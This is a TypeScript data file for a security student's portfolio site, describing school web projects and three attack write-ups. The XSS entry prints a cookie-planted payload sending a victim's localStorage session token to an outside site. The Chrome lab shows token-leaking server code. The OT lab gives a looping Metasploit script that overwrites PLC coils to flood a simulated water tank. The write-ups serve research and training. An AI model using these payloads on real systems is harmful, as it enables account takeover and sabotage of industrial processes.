
import { Project } from './types';

export const PROJECTS: Project[] = [
  {
    id: 'app-sec-2023',
    title: 'Application Security Project - 2023',
    description: 'A comprehensive group project involving the development and securing of a nationwide recycling game web application for Singapore, featuring computer vision, AI, and advanced security implementations.',
    category: 'School Project',
    imageUrl: 'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/screenshot-2023-12-31-201709.png?raw=true',
    sections: [
      {
        type: 'text',
        title: 'Project Grade: A',
        content: "This project required us to create a web application and implement necessary security features to secure the app.\n\nThe web application my group built was a web app to service a Singapore-wide recycling game to encourage recycling all over Singapore.\n\nThe app allows users to sign up and join the region that they live in. Upon recycling, they will be awarded points which will be contributed to the overall regional point tally. Whichever region has the most points in each season will earn a prize. Additionally, users can use the points earned to claim free vouchers."
      },
      {
        type: 'text',
        title: 'My Contributions',
        content: "I was in charge of building the features for staff to check the user's recycling and award the necessary points. All features were implemented with strong security measures to prevent vulnerabilities.\n\nTo check the user's recycling, I created a feature that utilizes **computer vision and machine learning** to scan the material being recycled and calculate the points that are needed to be awarded to the user.\n\n**Key Security Implementations:**\n- **API Integrity:** Checks implemented on API responses to ensure protection against malicious or manipulated responses.\n- **JWT Security:** Secure use of JWT tokens to prevent users from altering points awarded or claiming points twice."
      },
      {
        type: 'text',
        content: "I also created a feature to allow users to request a manual check in case the AI did not detect the recycled items properly. Staff can view these requests and make amendments accordingly.\n\nFor this feature, I implemented:\n- Strict Input Validation\n- CSRF Tokens\n- Data Integrity Checks\n- Access Control mechanisms\n\nLastly, I implemented a **reverse proxy** and set up a **Web Application Firewall (WAF)** using **ModSecurity** to scan for malicious packets using the **OWASP ModSecurity Core Rule Set**."
      },
      {
        type: 'slideshow',
        title: 'Project Gallery',
        images: [
          'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/screenshot-2023-12-31-201709.png?raw=true',
          'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/screenshot-2023-12-31-201751.png?raw=true',
          'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/screenshot-2023-12-31-201814.png?raw=true',
          'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/screenshot-2023-12-31-201850.png?raw=true',
          'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/screenshot-2023-12-31-201907.png?raw=true',
          'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/screenshot-2023-12-31-202011.png?raw=true',
          'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/screenshot-2023-12-31-202028.png?raw=true',
          'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/screenshot-2023-12-31-202038.png?raw=true',
          'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/screenshot-2023-12-31-202052.png?raw=true',
          'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/screenshot-2023-12-31-202117.png?raw=true',
          'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/screenshot-2023-12-31-202131.png?raw=true'
        ]
      }
    ]
  },
  {
    id: 'vuln-xss-cookie',
    title: 'XSS-Based Account Takeover via Malicious Cookie',
    description: 'A private security research project demonstrating how missing cookie validation on a shared domain led to Cross-Site Scripting (XSS) and full account takeover.',
    category: 'Security Testing',
    imageUrl: 'https://images.unsplash.com/photo-1614064641938-3bbee52942c7?q=80&w=2000&auto=format&fit=crop',
    sections: [
      {
        type: 'text',
        title: 'Project Context',
        content: "This security research project was conducted on a private web application. For confidentiality reasons, the company name is withheld, and I will refer to the target domain as example.com throughout this report."
      },
      {
        type: 'text',
        title: 'Vulnerability Discovery',
        content: "The target application hosted two distinct services on the same domain but under different paths:\n\n- example.com/service1\n- example.com/service2\n\nEach service maintained its own session management. However, because they shared the same domain, any cookies set with the root path (/) were accessible to both services, creating a cross-service communication channel that could be exploited."
      },
      {
        type: 'text',
        title: 'Step 1: Identifying the Source',
        content: "While analyzing the login flow, I identified a request that set a `redirect_url` cookie via a query parameter. The server accepted this input without any validation, allowing an attacker to control the cookie's value."
      },
      {
        type: 'code',
        title: 'Vulnerable Request & Response',
        language: 'http',
        code: "GET /setRedirectURL?redirect_url=example.com HTTP/1.1\nHost: example.com\n\nHTTP/1.1 200 OK\nSet-Cookie: redirect_url=example.com"
      },
      {
        type: 'text',
        content: "By modifying the `redirect_url` parameter to 'testing', I confirmed the cookie was set to 'testing' in the browser. This established my 'Source': I could plant a malicious payload into a victim's cookie simply by having them click a crafted link like:\n\nexample.com/setRedirectURL?redirect_url=<payload>"
      },
      {
        type: 'text',
        title: 'Step 2: Locating the Sink',
        content: "I then investigated where this `redirect_url` cookie was consumed. I discovered that if a user failed a login attempt and clicked the 'Login Again' button, the application would read this cookie.\n\nDeep-diving into the client-side JavaScript, I found the 'Sink': the application directly passed the cookie value to `location.href`. By injecting a payload using the `javascript:` pseudo-protocol, I could achieve arbitrary code execution. I verified this using `javascript://alert(1)`, which successfully triggered an alert box when the button was clicked."
      },
      {
        type: 'text',
        title: 'Step 3: Crafting the Exploit',
        content: "To escalate this into a full account takeover, I analyzed the application's session management. I found that session tokens were stored in `localStorage`, which is globally accessible to JavaScript. I crafted a payload to exfiltrate this token to a site I controlled."
      },
      {
        type: 'code',
        title: 'Final Exfiltration Payload',
        language: 'javascript',
        code: "javascript:window.location.href='https://kimchanyeop.github.io/?sessiontoken='+localStorage.getItem('SESSION-TOKEN');"
      },
      {
        type: 'flow',
        title: 'Full Attack Scenario',
        flow: [
          {
            step: '01',
            label: 'LINK_DELIVERY',
            details: "The attacker sends a malicious link to the victim: example.com/setRedirectURL?redirect_url=javascript:window.location.href='https://kimchanyeop.github.io/?sessiontoken='+localStorage.getItem('SESSION-TOKEN');"
          },
          {
            step: '02',
            label: 'COOKIE_STAGING',
            details: "When the victim clicks the link, their browser sets the 'redirect_url' cookie to the XSS payload."
          },
          {
            step: '03',
            label: 'SINK_TRIGGER',
            details: "The payload remains dormant until the victim experiences a failed login and clicks the 'Login Again' button."
          },
          {
            step: '04',
            label: 'ACCOUNT_TAKEOVER',
            details: "Upon clicking, the JavaScript executes, redirecting the victim and sending their session token to the attacker's server, granting full access to the account."
          }
        ]
      }
    ]
  },
  {
    id: 'chrome-0day-ato',
    title: 'Chrome 0day to ATO',
    description: 'A research lab replicating a Chrome vulnerability that leaks Referer headers, chained with OAuth misconfiguration for 1-Click ATO.',
    category: 'Lab',
    imageUrl: 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?q=80&w=2000&auto=format&fit=crop',
    sections: [
      {
        type: 'text',
        title: 'Overview & Credit',
        content: "Full credit for discovering this 0-day goes to **@slonser_**. This write-up documents my personal experimentation within a custom lab environment designed to analyze the vulnerability for educational purposes.\n\nLink to the original 0-day tweet: [https://x.com/slonser_/status/1919439373986107814](https://x.com/slonser_/status/1919439373986107814)"
      },
      {
        type: 'text',
        title: 'Vulnerability Analysis',
        content: "On May 6, @slonser shared his research on a Chrome 0-day vulnerability. This flaw allows an attacker to reveal full URL parameter values in the `Referer` header, bypassing standard privacy restrictions. It can be exploited wherever an attacker controls an image source.\n\nEssentially, if an image source points to a malicious site, that site can respond with a specific `Link` header. This header triggers a subsequent request with a `referrer-policy` of `unsafe-url`, causing the browser to send the full URL (including sensitive parameters) in the `Referer` header."
      },
      {
        type: 'text',
        title: 'Attack Scenario: 1-Click ATO',
        content: "A critical attack scenario leveraging this vulnerability is a **One-Click Account Takeover (ATO)**.\n\nIf a misconfigured OAuth process redirects a sensitive token to a page where an attacker can define an image source, the token can be leaked via the `Referer` header, leading to full account compromise."
      },
      {
        type: 'list',
        title: 'Lab Setup',
        items: [
          "A target webpage with an `/image` endpoint that accepts a `src` parameter to display images. The default referrer policy is `strict-origin-when-cross-origin`.",
          "A simulated OAuth Login Flow.",
          "A misconfigured OAuth implementation that allows manipulation of the redirect URL where the token is sent.",
          "A malicious `/leakSecret` endpoint controlled by the attacker, designed to exploit the Chrome 0-day.",
          "A logging page to capture and display incoming requests containing stolen data."
        ]
      },
      {
        type: 'image',
        imageUrl: 'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/Screenshot%202025-05-10%20014158%20(1).png?raw=true',
        caption: 'Simulating OAuth flow - Step 1'
      },
      {
        type: 'image',
        imageUrl: 'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/Screenshot%202025-05-10%20014225%20(2).png?raw=true',
        caption: 'Simulating OAuth flow - Step 2'
      },
      {
        type: 'image',
        imageUrl: 'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/Screenshot%202025-05-10%20014234%20(1).png?raw=true',
        caption: 'Successful login'
      },
      {
        type: 'image',
        imageUrl: 'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/Screenshot%202025-05-10%20014213%20(1).png?raw=true',
        caption: 'Set image source gadget'
      },
      {
        type: 'image',
        imageUrl: 'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/Screenshot%202025-05-10%20021726.png?raw=true',
        caption: 'Log Page for attacker to steal parameter values'
      },
      {
        type: 'list',
        title: 'Basic OAuth Steps',
        items: [
          "User attempts to log in using a third-party service (like Google).",
          "App redirects the user to the OAuth provider for authentication.",
          "User logs in and approves access to specific data.",
          "The OAuth provider redirects the user back to the app with an authorization code.",
          "The app exchanges the authorization code for an OAuth access token via a secure server-to-server request.",
          "The app uses the access token to retrieve user data."
        ]
      },
      {
        type: 'text',
        title: 'Simulating the OAuth Flow',
        content: "For simplicity, I simulated the OAuth flow as follows:\n\nThe URL `http://127.0.0.1:3000/login?auth_redirect=tokenLogin?redirect_url=afterLogin` serves as the login page. The `auth_redirect` parameter defines where the token is sent post-login.\n\nUpon successful \"login\", the user is redirected to `http://127.0.0.1:5000/tokenLogin?redirect_url=afterLogin&token=OAuth-Token`, carrying the sensitive token in the URL."
      },
      {
        type: 'text',
        title: 'The Exploit Chain',
        content: "Piecing the gadgets together for a 1-Click ATO:\n\nThe attacker constructs a malicious OAuth login link. The `auth_redirect` is modified to point to the vulnerable `/image` endpoint, with the `src` parameter set to the attacker-controlled `/leakSecret` URL.\n\n`http://127.0.0.1:3000/login?auth_redirect=image?src%3Dhttp://127.0.0.1:3000/leakSecret`\n\nWhen the victim authenticates, they are redirected to the `/image` endpoint. This page attempts to load the image from `http://127.0.0.1:3000/leakSecret`."
      },
      {
        type: 'code',
        title: 'Malicious Server Code',
        language: 'python',
        code: `@app.route('/leakSecret', methods=['GET'])
def leak_secret():
    image_path = "exploit.jpeg"
    response = make_response(send_file(image_path, mimetype='image/jpeg'))
    # Gadget: Link header forces unsafe-url policy for preloaded resource
    response.headers['Link'] = '<http://localhost:3000/log>; rel=preload; as="image"; referrerpolicy="unsafe-url"'
    return response`
      },
      {
        type: 'text',
        content: "Because the prefetch request is forced to use the `unsafe-url` referrer policy via the malicious `Link` header, the subsequent request includes the full URL in the `Referer` header. This leaks the OAuth token (present in the URL parameters) to the attacker.\n\nIn this lab, the `/log` endpoint captures these requests, allowing the attacker to view and use the stolen token to compromise the victim's account."
      },
      {
        type: 'video',
        title: 'Proof of Concept Demo',
        videoUrl: 'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/Chrome%200day%20ATO.mp4?raw=true',
        caption: 'Video demonstrating the 1-Click ATO execution flow'
      },
      {
        type: 'text',
        title: 'Conclusion',
        content: "Building this hands-on lab was a fruitful experience. It clarified the mechanics of this Chrome 0-day in a real-world context, demonstrating how it can be chained with OAuth misconfigurations to achieve a 1-click Account Takeover.\n\n**GitHub Repo:** [https://github.com/kimchanyeop/Chrome_0day_ATO_lab](https://github.com/kimchanyeop/Chrome_0day_ATO_lab)"
      }
    ]
  },
  {
    id: 'ot-research',
    title: 'Operational Technology Security Research',
    description: 'A personal research project involving the setup of an OT lab with ScadaBR and OpenPLC to simulate a water tank system, demonstrating vulnerabilities and attacks using Metasploit.',
    category: 'Lab',
    imageUrl: 'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/image%20(25).png?raw=true',
    sections: [
      {
        type: 'text',
        title: 'TL;DR',
        content: "During my internship at PSA, I was tasked with learning about OT security and creating training material. To gain a deeper understanding, I set up an OT lab with ScadaBR, OpenPLC, and Kali Linux to simulate a simple water tank system. After learning about vulnerabilities, I conducted an attack using Metasploit to manipulate the PLC and demonstrate the risk of an unsecured OT system. This hands-on research reinforced the importance of network segmentation and security controls, added a practical demo to my training materials, and helped me earn extra credit from my supervisor."
      },
      {
        type: 'text',
        title: 'Research Background and Motivation',
        content: "During my internship in PSA, there was a requirement by the group to carry out Operational Technology (OT) security training. Due to this requirement, I was tasked by my supervisor to learn about OT security and create a training material based on it. Since I was completely new to OT, I started by watching the ICS 300 video from Cybersecurity & Infrastructure Security Agency (CISA)."
      },
      {
        type: 'image',
        imageUrl: 'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/image%20(21).png?raw=true',
        caption: 'ICS 300 Training Material'
      },
      {
        type: 'text',
        content: "After completing the course I was documenting my learning and creating presentation slides to conduct OT training. However, I prefer to do more technical things and wasn't very satisfied with all the documentation work I was doing. So I thought \"why not I set up an OT environment myself and try out some exploits I learnt?\". This can help me to have better understanding on how OT environment works and its security. Also, if this is successful, I can make my OT training more interesting by adding a practical demo."
      },
      {
        type: 'text',
        title: 'OT Lab Setup',
        content: "The setup files for ScadaBR and OpenPLC can be found at my GitHub link below:\n\n[https://github.com/kimchanyeop/OT_lab_setup](https://github.com/kimchanyeop/OT_lab_setup)\n\n**Components Used:**\n- VMware - To run virtual machines\n- Ubuntu 18.04 - OpenPLC (act as a Programmable Logic Controller(PLC))\n- Ubuntu 18.04 - ScadaBR (Act as Human Machine Interface(HMI))\n- Kali Linux - Attacker machine"
      },
      {
        type: 'image',
        imageUrl: 'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/Untitled%20Diagram.drawio.png?raw=true',
        caption: 'Lab Architecture Diagram'
      },
      {
        type: 'text',
        content: "The setup was configured without implementing any security features or network segmentation. For simplicity, the attacker's machine was placed on the same network as ScadaBR and OpenPLC.\n\nThe steps to set up ScadaBR and OpenPLC can be found here: [Virtual Industrial Cybersecurity Lab Part 2](https://rodrigocantera.com/en/virtual-industrial-cybersecurity-lab-part-2-installation-of-openplc-and-scadabr/)"
      },
      {
        type: 'text',
        title: 'Coding with OpenPLC Editor',
        content: "To simulate an physical process in the OT environment, I have coded a PLC code using OpenPLC editor. Using ladder logic in OpenPLC editor, I have coded out a simple water tank system."
      },
      {
        type: 'image',
        imageUrl: 'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/image%20(23).png?raw=true',
        caption: 'OpenPLC Editor Ladder Logic'
      },
      {
        type: 'video',
        videoUrl: 'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/Ladder%20Logic.mp4?raw=true',
        caption: 'Ladder Logic Simulation'
      },
      {
        type: 'text',
        title: 'Physical Process Explanation',
        content: "The physical process I am simulation with the above code is a simple water tank system. This water tank system consists of a water tank and a pump. There is a constant flow of water into the water tank and the pump will drain out the water to prevent overflowing. The pump operates in two mode, manual and automatic. In manual mode, on and off button can be pressed in the HMI to control the pump. In automatic mode, the pump will be automatically activated when the tank is 90% full and will drain out all the water."
      },
      {
        type: 'text',
        title: 'Complete Setup',
        content: "With all the setup done properly, this is how it should be looking like:"
      },
      {
        type: 'image',
        imageUrl: 'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/image%20(25).png?raw=true',
        caption: 'Complete Lab Setup View 1'
      },
      {
        type: 'image',
        imageUrl: 'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/image%20(24).png?raw=true',
        caption: 'Complete Lab Setup View 2'
      },
      {
        type: 'image',
        imageUrl: 'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/image%20(26).png?raw=true',
        caption: 'Complete Lab Setup View 3'
      },
      {
        type: 'text',
        title: 'Time for the Attack 😈',
        content: "Now is the fun part where I get to break things.\n\nIn Kali Linux Metasploit, there is a Modbus client which allows me to control the PLC and change its memory value. What I can do is, I can find out the memory location for the operation mode of the pump (auto or manual) and the pump state (on or off) and modify the values to make the pump malfunctional.\n\nI have written a Metasploit script to repeatedly overwrite the memory value of the OpenPLC. This will make the PLC uncontrollable by the HMI as the values are constantly overwritten."
      },
      {
        type: 'code',
        title: 'OT_exploit.rc',
        language: 'bash',
        code: "use auxilary/scanner/scada/modbusclient\nset rhosts 192.168.239.141\nset action write_coils\nset data_address 0\nset data_coils 0010\nexploit\nresource ~/OT_exploit.rc"
      },
      {
        type: 'text',
        content: "Using the above script I am constantly turning off the pump and changing the pump to operate in manual mode. This will cause the pump to become uncontrollable using the HMI in ScadaBR causing the water tank to overflow."
      },
      {
        type: 'video',
        title: 'Attack Demonstration',
        videoUrl: 'https://youtu.be/pyY_akG-Yzs',
        caption: 'Full Attack Demo: Normal Operation -> Attack Launch -> System Failure'
      },
      {
        type: 'list',
        title: 'My Key Takeaways',
        items: [
          "Importance of OT security: This research done, shows the importance of having a proper network segmentation and security controls to prevent attackers from coming into the OT network. Once the OT network is compromised it is very easy for an attacker to take control of the physical processes running.",
          "Hands-On Learning: By engaging in practical experimentation, I gained a deeper understanding of how OT environments operate and how attackers could manipulate system controls. This hands-on approach greatly enhanced my understanding compared to purely theoretical learning.",
          "Value added for my OT training: From carrying out the research, I could come out with a demo exploit video which would definitely be more engaging. And most importantly, my supervisor liked my extra initiative!! that's an extra point for my internship grade."
        ]
      }
    ]
  },
  {
    id: 'app-dev-2022',
    title: 'Application Development Project - 2022',
    description: 'A comprehensive group project involving the full-stack development of an e-commerce platform for toys, featuring AR integration and secure payment processing.',
    category: 'School Project',
    imageUrl: 'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/screenshot-2023-12-31-at-21-44-28.jpg?raw=true',
    sections: [
      {
        type: 'text',
        title: 'Project Grade: Distinction',
        content: "This was a group project where we needed to build a web application. My group built an e-commerce website which sold toys."
      },
      {
        type: 'text',
        title: 'My Contributions',
        content: "I was in charge of building the main shop page and the payment integration.\n\n**Main Shop Page:**\n- Retrieving toy listings from the database.\n- Displaying inventory information and ratings.\n- Implementing sort and search functions for users to find toys.\n- 'Add to cart' functionality.\n\n**Product Detail Page:**\n- Detailed toy descriptions and images.\n- User reviews for purchased products.\n- **3D and Augmented Reality (AR)** views (supported on mobile).\n\n**Cart & Payment:**\n- Cart management page.\n- Secure checkout integration using the **Stripe API**."
      },
      {
        type: 'slideshow',
        title: 'Project Gallery',
        images: [
          'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/screenshot-2023-12-31-at-21-44-28.jpg?raw=true',
          'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/screenshot-2023-12-31-at-21-44-47.jpg?raw=true',
          'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/screenshot-2023-12-31-at-21-45-13.jpg?raw=true',
          'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/screenshot-2023-12-31-at-21-45-23.jpg?raw=true',
          'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/screenshot-2023-12-31-at-21-45-35.jpg?raw=true'
        ]
      }
    ]
  }
];
